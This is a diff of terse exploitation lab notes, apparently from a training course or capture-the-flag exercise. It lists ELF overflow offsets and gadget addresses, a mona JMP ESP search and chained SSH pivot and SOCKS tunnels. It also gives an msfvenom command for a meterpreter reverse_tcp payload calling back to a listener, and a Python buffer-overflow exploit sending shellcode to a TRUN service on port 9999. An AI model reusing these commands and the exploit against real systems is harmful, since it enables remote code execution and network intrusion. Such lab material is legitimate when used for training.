@@ -4,3 +4,74 @@ Reverse Engineering
     scp -P 30000 comrade@localhost:/var/www/html/consulting/public_html/longTermStorage/* .
     scp ctf/* student@10.50.24.101:C:/users/student/ctf
     
+ELF1
+
+    Press enter to view inventory: 
+    Total Inventory:
+    Bandages: 12
+    Kvass: 1.000
+    Turnips: 12.000
+    5.45x39: 20.000
+    AK-74M: 200
+    Zastava Koral: 50
+
+    ** seg fault good yes it did
+    
+    call   0x80484d6 <getTheGoods>
+    call   0x8048360 <printf@plt>
+    offset 76
+    
+    0xf7f5aa43
+    0xf7f65d43
+    0xf7f65d57
+    0xf7f65f9f
+    0xf7f65fc7
+    0xf7f65fd7
+    0xf7f66233
+    0xf7f664b7
+    0xf7f6663f
+    0xf7f66807
+    0xf7f6694b
+    0xf7f66b3f
+    0xf7f66d07
+    0xf7f66db7
+    0xf7f66eaf
+    0xf7f67237
+    0xf7f6731b
+    0xf7f6738b
+    0xf7f67a2f
+
+
+      WINDOWS 
+          004012D0 EIP
+          view -> log -> go to bottom white box that says 'call tree' -> type `!mona jmp -r ESP -m "essfunc.dll"` 
+              sfor funny endian change number
+              
+              ssh student@localhost -L 50000:10.50.40.227:22 -NT
+              ssh student@localhost -p 50000 -L 50001:192.168.28.105:2222 -NT
+              ssh comrade@localhost -p 50001 -D 9050 -NT
+              
+              msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.27.247 LPORT=8888 -b '\x00' -f python
+              
+              
+              
+               1 #!/usr/bin/python
+  2 
+  3 import socket
+  4 
+  5 buf = "TRUN /.:/"
+  6 buf += "A" * 2003
+  7 buf += "\xad\x12\x50\x62"
+  8 buf += "\x90" * 20
+  9 buf += b"\xbe\xec\xba\x2e\xce\xda\xcb\xd9\x74\x24\xf4\x5a\x29"
+ 10 buf += b"\xc9\xb1\x59\x31\x72\x14\x83\xea\xfc\x03\x72\x10\x0e"
+ 11  ....
+     ......
+     .....
+ 38 buf += b"\x01\x1b\x23\xd5"
+ 39 s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+ 40 s.connect(("192.168.150.245", 9999))
+ 41 print s.recv(1024)
+ 42 s.send(buf)
+ 43 s.close()
+
